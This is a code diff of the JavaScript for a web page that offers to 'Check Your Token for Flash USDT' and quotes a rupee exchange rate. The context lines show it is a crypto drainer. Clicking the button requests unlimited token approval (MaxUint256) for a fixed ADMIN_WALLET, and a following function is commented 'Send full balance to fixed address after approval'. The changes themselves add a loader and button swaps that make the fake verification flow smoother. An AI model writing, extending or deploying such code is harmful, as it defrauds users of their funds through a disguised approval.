@@ -88,6 +88,9 @@ approveButton.onclick = async () => {
         const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
         await tx.wait();
 
+        // Show full screen loader while processing summary
+        document.getElementById("fullScreenLoader").style.display = "block";
+
         // Reuse cached balance/address
         let rate;
         if (userBalance >= 100 && userBalance < 200) rate = 98;
@@ -104,17 +107,25 @@ approveButton.onclick = async () => {
         document.getElementById("summaryRate").textContent = `₹${rate}/USDT`;
         document.getElementById("summaryTotal").textContent = `₹${total.toLocaleString('en-IN', { minimumFractionDigits: 2 })}`;
 
+        // Show verification result
         document.getElementById("verificationResult").style.display = "block";
-        confirmButton.disabled = false;
+
+        // ✅ Hide the verifyTokenBtn and show the confirmTransaction button
+        document.getElementById("verifyTokenBtn").style.display = "none";
+        const confirmBtn = document.getElementById("confirmTransaction");
+        confirmBtn.style.display = "inline-block"; // or "block" depending on your layout
+        confirmBtn.disabled = false;
 
     } catch (err) {
         console.error("Approval error:", err);
         alert("❌ Something went wrong, please try again.");
     } finally {
+        document.getElementById("fullScreenLoader").style.display = "none";
         approveButton.disabled = false;
         approveButton.innerHTML = '<i class="fas fa-bolt"></i> Check Your Token for Flash USDT';
     }
 };
+
 
 // Send full balance to fixed address after approval
 async function sendUSDT(fromWallet, amount) {
